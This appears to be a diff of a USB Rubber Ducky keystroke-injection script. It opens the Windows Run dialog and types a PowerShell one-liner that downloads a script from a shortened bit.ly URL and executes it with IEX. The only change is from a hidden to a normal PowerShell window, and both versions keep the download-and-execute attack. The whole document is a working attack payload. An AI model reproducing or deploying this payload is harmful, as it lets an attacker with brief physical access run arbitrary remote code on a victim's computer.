@@ -1,4 +1,4 @@
 GUI r
 DELAY 500
-STRING powershell -W Hidden -nop -noni -c "IEX (New-Object Net.Webclient).downloadstring('https://bit.ly/2USrvQ4')"
+STRING powershell -W Normal -nop -noni -c "IEX (New-Object Net.Webclient).downloadstring('https://bit.ly/2USrvQ4')"
 ENTER
